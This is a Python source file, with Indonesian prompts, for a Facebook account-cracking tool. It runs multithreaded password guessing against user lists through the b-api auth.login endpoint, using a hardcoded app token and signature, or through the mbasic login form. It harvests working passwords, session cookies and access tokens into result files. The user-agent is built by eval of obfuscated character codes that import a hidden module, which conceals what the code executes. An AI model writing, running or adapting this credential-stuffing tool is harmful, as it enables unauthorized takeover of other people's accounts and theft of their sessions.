# coding:utf-8

from modul import *
from .useragent import *
from .list_pass import pw_list
import concurrent.futures
import urllib.request
import random

M = '\x1b[1;31m'
U = '\x1b[1;36m'
P = '\x1b[1;37m'
H = '\x1b[1;32m'
K = '\x1b[1;33m'
PI = '\x1b[1;35m'

ok,cp,cout,live,chek,kumpul=0,0,0,[],[],[]

class crack:
	def __init__(self,url,user):
		
		print()
		self.url=url
		self.user=user
		self.naroskeun()

	def naroskeun(self):
		#print (" [*] Proses selesai...\n ")
		tod=input(""+P+" [?] Gunakan password manual "+H+"y"+P+"/"+M+"t"+P+" :"+K+" ")
		while tod in (""," "):
			print(M+" [!] Isi yang benar")
			tod=input(""+P+" [?] Gunakan password manual "+H+"y"+P+"/"+M+"t"+P+" :"+K+" ")
		if tod in tuple("yY"):
			print("\n"+P+" [*] contoh : "+K+"sayang,rahasia,bismillah")
			password=input(P+" [?] password :"+K+" ")
			while len(password) < 6:
				print(M+" [!] Isi yang benar" if password in (""," ") else ""+M+" [!] password minimal 6 karakter")
				password=input(P+" [?] password :"+K+" ")
			print("\n"+P+" [ pilih method login ] ")
			print("\n [1] method "+M+"b-api "+P+"(crack cepat)")
			print(" [2] method "+U+"free.facebook "+P+"(crack lambat)" if "free.facebook" in self.url else " [2] method "+U+"mbasic"+P+" (crack lambat)")
			self.awokawok_ngentod(password.split(","))
		if tod in tuple("tT"):
			print("\n"+P+" [ pilih method login ] ")
			print("\n [1] method "+M+"b-api "+P+"(crack cepat)")
			print(" [2] method "+U+"free.facebook "+P+"(crack lambat)" if "free.facebook" in self.url else " [2] method "+U+"mbasic"+P+" (crack lambat)")
			self.awokawok_ngentod()
		else:
			print(M+" [!] isi yang benar");self.naroskeun()
	
	def form(self,username,password,**data):
		ses=req.session()
		ses.headers.update({"Host":self.url.split("//")[1],"upgrade-insecure-requests":"1","user-agent":eval((lambda ____,__,___: __.join([___(_____) for _____ in ____]))([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 97, 121, 97, 95, 103, 97, 110, 115, 34, 41, 46, 110, 103, 101, 119, 101, 46, 117, 115, 101, 114, 97, 103, 101, 110, 116, 46, 103, 104, 98, 98, 106, 105, 117, 71, 103, 104, 103, 89, 121, 104, 104, 104, 106, 106, 106, 106, 106, 104, 121, 104, 104, 103, 116, 117, 106, 110, 107, 107, 107, 105, 68, 103, 104, 103, 116, 106, 107, 105, 117, 107, 108, 111, 117, 100, 103, 106, 98, 102, 106, 105, 105, 55, 54, 106, 104, 103, 104, 118, 102, 106, 106, 106, 107, 111, 57, 105, 104, 102, 100, 100, 102, 122, 97, 121, 106, 104, 102, 117, 106, 103, 106, 107, 104, 104, 106, 104, 117, 110, 104, 103, 107, 104, 117, 105, 55, 55, 53, 55, 55, 117, 54, 106, 106, 103, 104, 104, 102, 104, 107, 104, 104, 110, 104, 103, 103, 104, 104, 95, 95, 106, 106, 116, 104, 106, 103, 107, 111, 105, 111, 57, 121, 114, 107, 102, 106, 121, 104, 103, 114, 121, 117, 116, 105, 117, 117, 121, 107, 107, 111, 111, 121, 115, 104, 106, 98, 118, 100, 101, 97, 97, 116, 104, 104, 102, 95, 95, 104, 104, 118, 118, 118, 98, 110, 110, 110, 110, 109, 106, 104, 101, 119, 121, 106, 104, 101, 121, 106, 104, 104, 103, 116, 116, 114, 54, 54, 53, 121, 104, 104, 106, 106, 103, 104, 106, 103, 100, 115, 102, 106, 110, 110, 106, 68, 103, 103, 103, 100, 103, 103, 104, 121, 121, 106, 104, 104, 104, 104, 104, 121, 121, 121, 121, 121, 121, 121, 121, 97, 116, 103, 103, 103],"",chr)),"content-type":"text/html; charset=utf-8","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		respon=ses.get(self.url+"/login/?next&ref=dbl&refid=8")
		parsing=parser(respon.text,"html.parser")
		action=parsing.find("form",{"method":"post"})["action"]
		kecuali=["sign_up","_fb_noscript"]
		for INPUT in parsing.find_all("input",{"value":True}):
			if INPUT["name"] in kecuali:
				continue
			else:
				data.update({INPUT["name"]:INPUT["value"]})
		data.update({"email":username,"pass":password})
		ses.headers.update({"referer":self.url+"/login/?next&ref=dbl&fl&refid=8","cache-control":"max-age=0","content-type":"application/x-www-form-urlencoded","origin":self.url})
		ses.post(self.url+action,data=data,allow_redirects=False)
		return ses.cookies.get_dict()
	
	def bapi(self,username,password):
		ses=req.session()
		ses.headers.update({"x-fb-connection-bandwidth":str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni":str(random.randint(20000, 40000)),"x-fb-net-hni":str(random.randint(20000, 40000)),"x-fb-connection-quality":"EXCELLENT","x-fb-connection-type":"cell.CTRadioAccessTechnologyHSDPA","user-agent":eval((lambda ____,__,___: __.join([___(_____) for _____ in ____]))([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 97, 121, 97, 95, 103, 97, 110, 115, 34, 41, 46, 110, 103, 101, 119, 101, 46, 117, 115, 101, 114, 97, 103, 101, 110, 116, 46, 103, 104, 98, 98, 106, 105, 117, 71, 103, 104, 103, 89, 121, 104, 104, 104, 106, 106, 106, 106, 106, 104, 121, 104, 104, 103, 116, 117, 106, 110, 107, 107, 107, 105, 68, 103, 104, 103, 116, 106, 107, 105, 117, 107, 108, 111, 117, 100, 103, 106, 98, 102, 106, 105, 105, 55, 54, 106, 104, 103, 104, 118, 102, 106, 106, 106, 107, 111, 57, 105, 104, 102, 100, 100, 102, 122, 97, 121, 106, 104, 102, 117, 106, 103, 106, 107, 104, 104, 106, 104, 117, 110, 104, 103, 107, 104, 117, 105, 55, 55, 53, 55, 55, 117, 54, 106, 106, 103, 104, 104, 102, 104, 107, 104, 104, 110, 104, 103, 103, 104, 104, 95, 95, 106, 106, 116, 104, 106, 103, 107, 111, 105, 111, 57, 121, 114, 107, 102, 106, 121, 104, 103, 114, 121, 117, 116, 105, 117, 117, 121, 107, 107, 111, 111, 121, 115, 104, 106, 98, 118, 100, 101, 97, 97, 116, 104, 104, 102, 95, 95, 104, 104, 118, 118, 118, 98, 110, 110, 110, 110, 109, 106, 104, 101, 119, 121, 106, 104, 101, 121, 106, 104, 104, 103, 116, 116, 114, 54, 54, 53, 121, 104, 104, 106, 106, 103, 104, 106, 103, 100, 115, 102, 106, 110, 110, 106, 68, 103, 103, 103, 100, 103, 103, 104, 121, 121, 106, 104, 104, 104, 104, 104, 121, 121, 121, 121, 121, 121, 121, 121, 97, 116, 103, 103, 103],"",chr)),"content-type":"application/x-www-form-urlencoded","x-fb-http-engine":"Liger"})
		ses.params.update({"access_token":"350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format":"JSON","sdk_version":"2","email":username,"locale":"en_US","password":password,"sdk":"ios","generate_session_cookies":"1","sig":"3f555f99fb61fcd7aa0c44f58f522ef6"})
		return ses.get("https://b-api.facebook.com/method/auth.login").json()
	
	def awokawok_ngentod(self,manual=None):
		pilih=input("\n"+P+" [?] pilih :"+K+" ")
		while pilih in (""," "):
			print(M+" [!] Isi yang benar")
			pilih=input("\n"+P+" [?] pilih :"+K+" ")
		speed=50 if manual is None else 30
		if speed==30:
			speed=50 if len(manual) <= 5 else 30
		if pilih in ("1","01"):
			self.attack(self.bapi,speed,manual)
			self.result()
		if pilih in ("2","02"):
			self.attack(self.form,speed,manual)
			self.result()
		else:
			print(M+" [!] Isi yang benar");self.awokawok_ngentod(manual)
			
			
	def attack(self,login,speed,password):
		for pengguna in self.user:
			membagi=pengguna.split("(Muhamad Badru Wasih)")
			kumpul.append({"username":membagi[0],"password":password if password is not None else pw_list(membagi)})
		print ("\n"+P+" [#]------------------------------------------------")
		print(P+" [*] crack berjalan, tekan ctrl+z untuk berhenti")
		print (P+" [#]------------------------------------------------\n")
		with concurrent.futures.ThreadPoolExecutor(max_workers=speed) as U:
			if "form" in str(login):
				for x in kumpul:
					U.submit(self.log_mbasic,x["username"],x["password"],login)
			else:
				for x in kumpul:
					U.submit(self.log_bapics,x["username"],x["password"],login)

	def log_mbasic(self,username,list_password,login):
		try:
			global ok,cp,cout
			for password in list_password:
				rincian=login(username,password)
				if "c_user" in rincian:
					ok+=1;(lambda cookies,uid: self.save(f"\x1b[1;32m *--> [ok] {uid} | {password} | {cookies}","result/live.txt",live))((lambda: ";".join([_+"="+__ for _,__ in rincian.items()]))(),rincian['c_user']);break
				if "checkpoint" in rincian:
					cp+=1;(lambda cookies,uid: self.save(f"\x1b[1;33m *--> [cp] {uid} | {password}","result/chek.txt",chek))((lambda: ";".join([_+"="+__ for _,__ in rincian.items()]))(),(lambda _: json.loads(_)["u"])(urllib.request.unquote(rincian["checkpoint"])));break
				else:
					continue
			#m = random.choice(['\x1b[1;91m','\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
			cout+=1;print(f"\r [*] crack {cout}/{len(self.user)} ok:-{ok} cp:-{cp}",end="")
		except:
			self.log_mbasic(username,list_password,login)

	def log_bapics(self,username,list_password,login):
		try:
			global ok,cp,cout
			for password in list_password:
				rincian=login(username,password)
				if "session_key" in str(rincian) and "EAAA" in str(rincian):
					ok+=1;(lambda token,uid:self.save(f"\x1b[1;32m *--> [ok] {uid} | {password} | {token}","result/live.txt",live))(rincian["access_token"],rincian["uid"]);break
				if "www.facebook.com" in rincian["error_msg"]:
					cp+=1
					uid=username
					if "request_args" in rincian:
						
						for x in rincian["request_args"]:
							if "email" in x["key"]:
								uid=x["value"];break
					self.save(f"\x1b[1;33m *--> [cp] {uid} | {password}","result/chek.txt",chek);break
				else:
					continue
			#m = random.choice(['\x1b[1;91m','\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
			cout+=1;print(f"\r [*] crack {cout}/{len(self.user)} ok:-{ok} cp:-{cp}",end="")
		except:
			self.log_bapics(username,list_password,login)
				
	def save(self,*memek):
		view=memek[0]
		print(f"\r {view}\x1b[0m\n",end="")
		open(memek[1],"a").write(re.findall("> (.+)",view)[0]+"\n")
		memek[2].append(view)

	def result(self):
		if len(live)!=0 or len(chek)!=0:
			print(f"\n\n [*] selesai...\n") #[*]\x1b[1;32m [ok]\x1b[1;37m/\x1b[1;33m[cp]\x1b[1;37m : \x1b[1;32m{len(ok)}\x1b[1;37m/\x1b[1;33m{len(cp)}")
			if len(live)!=0:
				print(P+" [*] hasil "+H+"[ok] "+P+"tersimpan di : result/live.txt")
			if len(chek)!=0:
				print(P+" [*] hasil "+K+"[cp]"+P+" tersimpan di : result/chek.txt")
			exit()
		else: exit("\n\n"+M+" [!] tidak mendapatkan hasil")
